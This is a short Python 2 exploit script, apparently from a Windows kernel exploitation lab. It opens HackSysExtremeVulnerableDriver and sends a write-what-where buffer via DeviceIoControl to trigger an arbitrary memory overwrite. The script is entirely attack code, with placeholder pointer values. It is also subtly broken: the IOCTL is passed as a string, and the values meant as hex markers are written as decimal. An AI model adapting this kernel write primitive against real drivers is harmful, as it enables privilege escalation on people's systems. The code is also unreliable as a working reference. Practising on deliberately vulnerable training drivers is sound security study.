import ctypes, struct, sys, os, win32con, time
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

def arbitrary_overwrite():
    """ Main Logic """
    driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
    if not driver_handle or driver_handle == -1:
        print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
        sys.exit()
    else:
                print "[X] Communicated with appropriate driver."

                where_ptr = 42424242
                what_ptr = 41414141 
                whatwhere = struct.pack("<Q", what_ptr) + struct.pack("<Q", where_ptr)
                input_size = len(whatwhere)
                dwReturn = c_ulonglong() #all 64 bit so longlong...
                IOCTL = "0x22200B"
                kernel32.DeviceIoControl(driver_handle,
                                         IOCTL,
                                         whatwhere,
                                         input_size,
                                         None,
                                         0,byref(dwReturn),
                                         None)  




        
if __name__ == '__main__':
    arbitrary_overwrite()
